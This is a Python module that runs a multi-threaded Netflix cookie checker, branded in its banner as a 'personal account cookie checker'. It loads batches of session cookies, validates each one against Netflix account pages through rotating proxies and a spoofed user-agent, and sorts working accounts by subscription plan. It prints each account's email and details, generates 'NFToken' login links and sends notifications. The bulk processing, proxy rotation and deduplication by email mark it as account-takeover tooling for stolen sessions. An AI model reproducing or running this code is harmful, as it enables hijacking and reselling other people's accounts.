"""Multi-threaded cookie checking runner."""

from __future__ import annotations

import os
import queue
import random
import re
import shutil
import string
import threading
from datetime import datetime
from typing import Any, Dict, List, Optional, Set

import requests

from .config import get_nftoken_mode
from .cookies import apply_cookies_to_session, extract_cookie_bundles
from .extract import extract_info, has_complete_account_info, merge_info
from .nftoken import create_nftoken
from .nftoken import build_nftoken_links, has_usable_nftoken
from .notify import build_account_detail_lines, format_cookie_file, send_notifications
from .plans import (
    derive_output_plan_bucket,
    get_canonical_output_label,
    is_on_hold_account,
    is_subscribed_account,
)
from .proxy import load_proxies, pick_proxy
from .utils import (
    clear_screen,
    color_text,
    decode_netflix_value,
    format_plan_label,
    sanitize_filename,
    set_console_title,
    write_text_file,
)

COOKIES_FOLDER = "cookies"
OUTPUT_FOLDER = "output"
FAILED_FOLDER = "failed"
BROKEN_FOLDER = "broken"

BANNER = r"""
 _   _      _    __ _ _        ____ _               _
| \ | | ___| |_ / _| (_)_  __ / ___| |__   ___  ___| | _____ _ __
|  \| |/ _ \ __| |_| | \ \/ /| |   | '_ \ / _ \/ __| |/ / _ \ '__|
| |\  |  __/ |_|  _| | |>  < | |___| | | |  __/ (__|   <  __/ |
|_| \_|\___|\__|_| |_|_/_/\_\ \____|_| |_|\___|\___|_|\_\___|_|

  Personal account cookie checker  |  clean rewrite  |  v1.0.0
"""


def create_base_folders() -> None:
    for folder in (COOKIES_FOLDER, OUTPUT_FOLDER, FAILED_FOLDER, BROKEN_FOLDER):
        os.makedirs(folder, exist_ok=True)


def get_run_folder() -> str:
    return f"run_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"


def sanitize_reason(reason: str) -> str:
    cleaned = (decode_netflix_value(reason) or "unknown_reason").strip().lower()
    cleaned = re.sub(r"[^a-z0-9]+", "_", cleaned).strip("_")
    return cleaned or "unknown_reason"


def build_reason_filename(original_name: str, reason: str) -> str:
    base, ext = os.path.splitext(original_name)
    return f"{sanitize_reason(reason)}_{sanitize_filename(base)}{ext or '.txt'}"


def move_cookie_with_reason(
    cookie_path: str, target_folder: str, cookie_file: str, reason: str
) -> None:
    if not os.path.exists(cookie_path):
        return
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base, ext = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base}_{suffix}{ext}")
    shutil.move(cookie_path, target_path)


def write_cookie_with_reason(
    target_folder: str, cookie_file: str, reason: str, content: str
) -> None:
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base, ext = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base}_{suffix}{ext}")
    write_text_file(target_path, content)


def describe_http_error(status_code: int) -> str:
    mapping = {
        403: "HTTP 403 Forbidden",
        429: "HTTP 429 Rate Limited",
        500: "HTTP 500 Server Error",
        502: "HTTP 502 Bad Gateway",
        503: "HTTP 503 Service Unavailable",
        504: "HTTP 504 Gateway Timeout",
    }
    return mapping.get(status_code, f"HTTP {status_code}")


def create_output_path(
    base_folder: str, plan_label: str, run_folder: str, category: Optional[str] = None
) -> str:
    safe_plan = sanitize_filename(decode_netflix_value(plan_label) or "Unknown")
    if category:
        safe_cat = sanitize_filename(decode_netflix_value(category) or "Other")
        path = os.path.join(base_folder, run_folder, safe_cat, safe_plan)
    else:
        path = os.path.join(base_folder, run_folder, safe_plan)
    os.makedirs(path, exist_ok=True)
    return path


def get_account_page(
    session: requests.Session,
    proxy: Optional[Dict] = None,
    request_timeout: int = 15,
    fallback_account_page: bool = True,
):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
    }
    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(
        membership_url, headers=headers, proxies=proxy, timeout=request_timeout
    )
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        if not fallback_account_page or has_complete_account_info(primary_info):
            return response.text, response.status_code, primary_info
        try:
            fallback = session.get(
                "https://www.netflix.com/YourAccount",
                headers=headers,
                proxies=proxy,
                timeout=request_timeout,
            )
            if fallback.status_code == 200 and fallback.text:
                fallback_info = extract_info(fallback.text)
                return response.text, response.status_code, merge_info(
                    primary_info, fallback_info
                )
        except Exception:
            pass
        return response.text, response.status_code, primary_info
    return response.text, response.status_code, None


def render_simple_dashboard(
    counts: Dict[str, int],
    plan_counts: Dict[str, int],
    plan_labels: Dict[str, str],
    cookies_left: int,
    cookies_total: int,
) -> None:
    clear_screen()
    processed = cookies_total - cookies_left
    valid = counts["hits"] + counts["free"]
    print(BANNER)
    print(color_text("Netflix Account Checker - Simple Mode", "\033[96m"))
    print(
        f"{color_text('Progress:', '\033[96m')} "
        f"{color_text(str(processed), '\033[92m')}/{color_text(str(cookies_total), '\033[92m')} "
        f"| Left: {color_text(str(cookies_left), '\033[93m')}"
    )
    print("")
    print(color_text("Plan Counts", "\033[95m"))
    order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free"]
    extra_by_base: Dict[str, int] = {}
    for key, value in plan_counts.items():
        if str(key).startswith("extra_member_") and value > 0:
            base = str(key)[len("extra_member_") :] or "unknown"
            extra_by_base[base] = extra_by_base.get(base, 0) + value
    keys = order + sorted(
        k
        for k in plan_counts
        if k not in order and not str(k).startswith("extra_member_")
    )
    for plan_key in keys:
        base_value = plan_counts.get(plan_key, 0)
        extra_value = extra_by_base.get(plan_key, 0)
        total = base_value + extra_value
        if plan_key == "unknown" and total <= 0:
            continue
        label = (
            decode_netflix_value(plan_labels.get(plan_key))
            or format_plan_label(plan_key)
        )
        print(f"  {label}: {total}")
        if extra_value > 0:
            print(f"    └─ Extra Member: {extra_value}")
    print("")
    print(color_text("Status", "\033[95m"))
    print(f"  Valid : {color_text(str(valid), '\033[92m')}")
    print(f"  Good  : {color_text(str(counts['hits']), '\033[92m')}")
    print(f"  Free  : {color_text(str(counts['free']), '\033[95m')}")
    print(f"  Bad   : {color_text(str(counts['bad']), '\033[91m')}")
    print(f"  Dup   : {color_text(str(counts['duplicate']), '\033[93m')}")
    print(f"  OnHold: {color_text(str(counts['on_hold']), '\033[96m')}")
    print(f"  Err   : {color_text(str(counts['errors']), '\033[91m')}")


def print_status(
    status: str,
    cookie_file: str,
    country: Optional[str] = None,
    plan: Optional[str] = None,
    reason: Optional[str] = None,
    detail_lines: Optional[List[str]] = None,
    output_path: Optional[str] = None,
) -> None:
    colors = {
        "success": "\033[33m",
        "free": "\033[34m",
        "duplicate": "\033[35m",
        "failed": "\033[31m",
        "error": "\033[31m",
    }
    reset = "\033[0m"
    details = []
    if country:
        details.append(f"Country: {country}")
    if plan:
        details.append(f"Plan: {plan}")
    detail = f" [{' | '.join(details)}]" if details else ""
    path = f"cookies\\{cookie_file}"
    code = colors.get(status, "")
    if status == "success":
        print(f"> {code}OK {path}{detail}. Saved to output/{reset}")
    elif status == "free":
        print(f"> {code}OK (no sub) {path}{detail}. Saved to Free/{reset}")
    elif status == "failed":
        print(f"> {code}FAILED {path}. {reason or ''} -> failed/{reset}")
    elif status == "duplicate":
        print(f"> {code}DUPLICATE {path} -> output/Duplicate/{reset}")
    elif status == "error":
        print(f"> {code}ERROR {path}. {reason or ''} -> broken/{reset}")

    # Full account dump on screen for personal testing
    if detail_lines and status in {"success", "free"}:
        print(color_text("  -------- Account Info --------", "\033[96m"))
        for line in detail_lines:
            print(f"  {line}")
        if output_path:
            print(color_text(f"  Saved: {output_path}", "\033[90m"))
        print(color_text("  ------------------------------", "\033[96m"))


def check_cookies(num_threads: int = 10, config: Optional[Dict] = None) -> None:
    if config is None:
        config = {}
    create_base_folders()

    counts = {
        "hits": 0,
        "free": 0,
        "bad": 0,
        "duplicate": 0,
        "on_hold": 0,
        "errors": 0,
    }
    plan_counts: Dict[str, int] = {}
    plan_labels: Dict[str, str] = {}
    processed_emails: Set[str] = set()
    run_folder = get_run_folder()
    stop_requested = threading.Event()
    lock = threading.Lock()

    display_mode = str(config.get("display", {}).get("mode", "log")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "log"

    proxies = load_proxies()
    retries_cfg = config.get("retries", {})
    perf = config.get("performance", {})
    try:
        max_retries = max(1, int(retries_cfg.get("error_proxy_attempts", 3)))
    except Exception:
        max_retries = 3
    try:
        nftoken_attempts = max(1, int(retries_cfg.get("nftoken_attempts", 1)))
    except Exception:
        nftoken_attempts = 1
    try:
        timeout = max(5, int(perf.get("request_timeout_seconds", 15)))
    except Exception:
        timeout = 15
    fallback_page = bool(perf.get("fallback_account_page", True))
    retry_incomplete = bool(perf.get("retry_incomplete_info", False))
    nftoken_for_free = bool(perf.get("nftoken_for_free", False))
    nftoken_mode = get_nftoken_mode(config)
    retryable = {403, 429, 500, 502, 503, 504}

    cookie_files = [
        f
        for f in os.listdir(COOKIES_FOLDER)
        if f.lower().endswith((".txt", ".json")) and not f.startswith(".")
    ]
    tasks: List[Dict[str, Any]] = []

    for cookie_file in cookie_files:
        cookie_path = os.path.join(COOKIES_FOLDER, cookie_file)
        try:
            with open(cookie_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read()
        except Exception:
            tasks.append(
                {
                    "kind": "read_error",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                }
            )
            continue

        bundles = extract_cookie_bundles(content)
        if not bundles:
            tasks.append(
                {
                    "kind": "missing_cookies",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                }
            )
            continue

        total = len(bundles)
        for bundle in bundles:
            idx = bundle.get("index", 1)
            name = cookie_file if total <= 1 else f"{os.path.splitext(cookie_file)[0]}__part_{idx}_of_{total}.txt"
            label = cookie_file if total <= 1 else f"{cookie_file} [{idx}/{total}]"
            tasks.append(
                {
                    "kind": "bundle",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                    "bundle": bundle,
                    "bundle_file": name,
                    "bundle_label": label,
                    "remove_source": total <= 1,
                }
            )

    cookies_total = len(tasks)
    cookies_left = [cookies_total]
    task_queue: queue.Queue = queue.Queue()
    for task in tasks:
        task_queue.put(task)

    if display_mode == "log":
        print(f"Total cookies: {cookies_total}")
        print(f"Total proxies: {len(proxies)}")
        print(f"Threads: {num_threads}")
        print("\nStarting...\n")
    else:
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total)

    def update_title() -> None:
        valid = counts["hits"] + counts["free"]
        set_console_title(
            f"Left {cookies_left[0]}/{cookies_total} Valid {valid} "
            f"Fail {counts['bad']} Dup {counts['duplicate']} "
            f"Hold {counts['on_hold']} Err {counts['errors']}"
        )

    def record_result(
        result_type: str,
        label: str,
        plan_key: Optional[str] = None,
        plan_name: Optional[str] = None,
        result_reason: Optional[str] = None,
        result_country: Optional[str] = None,
        result_on_hold: bool = False,
        detail_lines: Optional[List[str]] = None,
        output_path: Optional[str] = None,
    ) -> None:
        with lock:
            cookies_left[0] = max(0, cookies_left[0] - 1)
            if result_type == "success":
                counts["hits"] += 1
                if result_on_hold:
                    counts["on_hold"] += 1
            elif result_type == "free":
                counts["free"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            elif result_type == "failed":
                counts["bad"] += 1
            else:
                counts["errors"] += 1

            if plan_key and result_type in {"success", "free"}:
                plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                if plan_name:
                    plan_labels[plan_key] = plan_name

            update_title()
            # Always print full account info when available (personal testing)
            status_map = {
                "success": "success",
                "free": "free",
                "duplicate": "duplicate",
                "failed": "failed",
                "error": "error",
            }
            if display_mode == "simple" and result_type not in {"success", "free"}:
                render_simple_dashboard(
                    counts, plan_counts, plan_labels, cookies_left[0], cookies_total
                )
            else:
                if display_mode == "simple" and result_type in {"success", "free"}:
                    # Keep dashboard but do not clear full detail dump after it
                    render_simple_dashboard(
                        counts, plan_counts, plan_labels, cookies_left[0], cookies_total
                    )
                print_status(
                    status_map.get(result_type, "error"),
                    label,
                    country=result_country,
                    plan=plan_name,
                    reason=result_reason,
                    detail_lines=detail_lines,
                    output_path=output_path,
                )

    def handle_result(
        info: Dict,
        netscape_content: str,
        cookie_path: str,
        bundle_file: str,
        is_subscribed: bool,
        cookies: Dict[str, str],
        remove_source: bool,
    ):
        email = (decode_netflix_value(info.get("email")) or "").strip().lower()
        with lock:
            if email and email in processed_emails:
                is_dup = True
            else:
                is_dup = False
                if email:
                    processed_emails.add(email)

        if is_dup:
            out_dir = create_output_path(OUTPUT_FOLDER, "Duplicate", run_folder)
            write_text_file(os.path.join(out_dir, bundle_file), netscape_content)
            if remove_source and os.path.exists(cookie_path):
                try:
                    os.remove(cookie_path)
                except Exception:
                    pass
            return "duplicate", "duplicate", "Duplicate", False, None, None

        plan_key, folder_label, display_label = derive_output_plan_bucket(
            info, is_subscribed
        )
        on_hold = is_subscribed and is_on_hold_account(info)

        nftoken_data = None
        should_token = nftoken_mode != "false" and (
            is_subscribed or nftoken_for_free
        )
        if should_token:
            nftoken_data, _ = create_nftoken(cookies, attempts=nftoken_attempts)

        formatted = format_cookie_file(
            info, netscape_content, config, is_subscribed, nftoken_data
        )
        detail_lines = build_account_detail_lines(
            config,
            info,
            is_subscribed,
            use_emojis=False,
            include_country_flag=True,
            show_all=True,
        )
        if has_usable_nftoken(nftoken_data):
            detail_lines = list(detail_lines)
            detail_lines.append("")
            detail_lines.append("NFToken (login links):")
            detail_lines.append(f"NFToken: {nftoken_data['token']}")
            for label, link in build_nftoken_links(
                nftoken_data.get("token"), nftoken_mode
            ):
                detail_lines.append(f"{label}: {link}")
            if nftoken_data.get("expires_at_utc"):
                detail_lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")
        elif should_token:
            detail_lines = list(detail_lines)
            detail_lines.append("NFToken: (failed to generate — cookie may lack access)")

        if on_hold:
            out_dir = create_output_path(
                OUTPUT_FOLDER, folder_label, run_folder, category="On Hold"
            )
        else:
            out_dir = create_output_path(OUTPUT_FOLDER, folder_label, run_folder)

        out_name = bundle_file if bundle_file.lower().endswith(".txt") else f"{bundle_file}.txt"
        saved_path = os.path.join(out_dir, out_name)
        write_text_file(saved_path, formatted)

        if remove_source and os.path.exists(cookie_path):
            try:
                os.remove(cookie_path)
            except Exception:
                pass

        send_notifications(
            config,
            info,
            is_subscribed,
            plan_key,
            out_name,
            netscape_content,
            nftoken_data,
        )
        result_type = "success" if is_subscribed else "free"
        return result_type, plan_key, display_label, on_hold, detail_lines, saved_path

    def process_task(task: Dict) -> None:
        if stop_requested.is_set():
            return

        kind = task.get("kind")
        cookie_file = task["cookie_file"]
        cookie_path = task["cookie_path"]

        if kind == "read_error":
            move_cookie_with_reason(cookie_path, BROKEN_FOLDER, cookie_file, "read_error")
            record_result("error", cookie_file, result_reason="read_error")
            return
        if kind == "missing_cookies":
            move_cookie_with_reason(
                cookie_path, FAILED_FOLDER, cookie_file, "missing_required_cookies"
            )
            record_result(
                "failed", cookie_file, result_reason="missing required cookies"
            )
            return

        bundle = task["bundle"]
        bundle_file = task["bundle_file"]
        bundle_label = task["bundle_label"]
        remove_source = task["remove_source"]
        netscape_content = bundle["netscape_text"]
        cookies = bundle["cookies"]

        result_type = "error"
        result_reason = None
        plan_key = None
        plan_name = None
        result_country = None
        result_on_hold = False
        detail_lines = None
        output_path = None
        last_exception = None
        status_code = None
        response_text = None
        extracted_info = None
        used_proxy_indices: Set[int] = set()

        try:
            session = requests.Session()
            apply_cookies_to_session(session, cookies)

            for attempt in range(max_retries):
                proxy, proxy_index = pick_proxy(proxies, used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)
                try:
                    response_text, status_code, extracted_info = get_account_page(
                        session,
                        proxy,
                        request_timeout=timeout,
                        fallback_account_page=fallback_page,
                    )
                    if status_code == 200 and response_text:
                        if retry_incomplete and attempt < max_retries - 1:
                            if not (
                                extracted_info
                                and has_complete_account_info(extracted_info)
                            ):
                                continue
                        break
                    if status_code in retryable and attempt < max_retries - 1:
                        continue
                    break
                except Exception as exc:
                    last_exception = exc
                    if attempt < max_retries - 1:
                        continue

            if status_code == 200 and response_text:
                info = extracted_info or extract_info(response_text)
                # Accept hit when we have country OR membership/plan (more robust)
                has_signal = any(
                    info.get(k) and info.get(k) != "null"
                    for k in (
                        "countryOfSignup",
                        "membershipStatus",
                        "localizedPlanName",
                        "email",
                    )
                )
                if has_signal:
                    is_sub = is_subscribed_account(info)
                    result_country = info.get("countryOfSignup")
                    (
                        result_type,
                        plan_key,
                        plan_name,
                        result_on_hold,
                        detail_lines,
                        output_path,
                    ) = handle_result(
                        info,
                        netscape_content,
                        cookie_path,
                        bundle_file,
                        is_sub,
                        cookies,
                        remove_source,
                    )
                else:
                    result_type = "failed"
                    result_reason = "incomplete account page"
                    if remove_source:
                        move_cookie_with_reason(
                            cookie_path, FAILED_FOLDER, cookie_file, result_reason
                        )
                    else:
                        write_cookie_with_reason(
                            FAILED_FOLDER, bundle_file, result_reason, netscape_content
                        )
            elif last_exception is not None or status_code in retryable:
                result_type = "error"
                if status_code in retryable:
                    result_reason = describe_http_error(status_code)
                elif isinstance(last_exception, requests.exceptions.Timeout):
                    result_reason = "timeout"
                else:
                    result_reason = "proxy error"
                if remove_source:
                    move_cookie_with_reason(
                        cookie_path, BROKEN_FOLDER, cookie_file, result_reason
                    )
                else:
                    write_cookie_with_reason(
                        BROKEN_FOLDER, bundle_file, result_reason, netscape_content
                    )
            else:
                result_type = "failed"
                result_reason = "incomplete account page"
                if remove_source:
                    move_cookie_with_reason(
                        cookie_path, FAILED_FOLDER, cookie_file, result_reason
                    )
                else:
                    write_cookie_with_reason(
                        FAILED_FOLDER, bundle_file, result_reason, netscape_content
                    )
        except Exception:
            result_type = "error"
            result_reason = result_reason or "proxy error"
            try:
                if remove_source:
                    move_cookie_with_reason(
                        cookie_path, BROKEN_FOLDER, cookie_file, result_reason
                    )
                else:
                    write_cookie_with_reason(
                        BROKEN_FOLDER, bundle_file, result_reason, netscape_content
                    )
            except Exception:
                pass
        finally:
            record_result(
                result_type or "error",
                bundle_label,
                plan_key=plan_key,
                plan_name=plan_name,
                result_reason=result_reason,
                result_country=result_country,
                result_on_hold=result_on_hold,
                detail_lines=detail_lines,
                output_path=output_path,
            )

    def worker() -> None:
        while not stop_requested.is_set():
            try:
                task = task_queue.get_nowait()
            except queue.Empty:
                break
            process_task(task)

    threads = []
    for _ in range(max(1, min(num_threads, 100))):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)

    try:
        for t in threads:
            t.start()
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.2)
    except KeyboardInterrupt:
        stop_requested.set()
        print(color_text("\nStopping...", "\033[93m"))
        for t in threads:
            t.join(timeout=1)
        set_console_title("Stopped")
        return

    valid = counts["hits"] + counts["free"]
    set_console_title(
        f"Finished Valid {valid} Fail {counts['bad']} "
        f"Dup {counts['duplicate']} Hold {counts['on_hold']} Err {counts['errors']}"
    )

    if display_mode == "simple":
        render_simple_dashboard(
            counts, plan_counts, plan_labels, cookies_left[0], cookies_total
        )
        print(color_text("\nFinished Checking", "\033[92m"))
    else:
        print(color_text("\n\n========== Final Summary ==========", "\033[95m"))
        print(f"Checked   : {cookies_total}")
        print(f"Good      : {counts['hits']}")
        print(f"Free      : {counts['free']}")
        print(f"Bad       : {counts['bad']}")
        print(f"Duplicate : {counts['duplicate']}")
        print(f"OnHold    : {counts['on_hold']}")
        print(f"Errors    : {counts['errors']}")
        print(color_text("===================================", "\033[95m"))
